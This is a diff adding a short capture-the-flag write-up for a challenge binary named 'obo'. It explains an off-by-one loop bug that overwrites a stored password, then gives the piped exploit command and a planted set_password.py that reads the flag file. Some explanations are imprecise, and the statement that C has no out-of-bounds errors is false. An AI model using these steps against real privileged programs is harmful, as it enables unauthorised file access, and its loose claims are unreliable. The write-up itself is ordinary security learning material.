@@ -1,0 +1,31 @@
+The code for obo is faulty in a few locations, and there are a couple of
+out of bounds errors (OBO).
+
+    for (i = 0; i <= strlen(new_password); ++i) {
+        int index = hex_table[(unsigned char) new_password[i]];
+        if (index == -1) {
+            printf("Invalid character: %c\n", new_password[i]);
+            exit(1);
+        }
+        digits[index] = 1;
+    }
+
+In this section of obo, the programmer makes the fatal error of doing <= instead of <.
+As a result, when digits[index] is called, digits[16] will become 1, but digits only goes up to an index of 15.
+In C, there are no out of bounds errors, since the program will just write to the next stack, which
+just so happens to be password. The password is now 1.
+We also know the value of the password which will not give us an error which is 'abcdefg123456789'.
+With this, we can successfully exploit obo
+
+    python -c "print 'abcdefg123456789\n\1'" | /home/obo/obo
+
+The \n denotes a new line, so we can enter the number 1 as the old password, which was overwritten as 1.
+But we didn't get the flag just yet. The file executes a python command that reads a file called 'set_password.py'.
+Now, in a directory where we have write access, we can do:
+
+    echo "f = open('/home/obo/flag.txt').read()\n print f" > set_password.py
+    python -c "print 'abcdefg123456789\n\1'" | /home/obo/obo
+
+We have injected our fake password file, which reads the set_password.py from the directory
+where the user executed obo. With our new injection, we can just re-run the exploitation and
+get the flag.
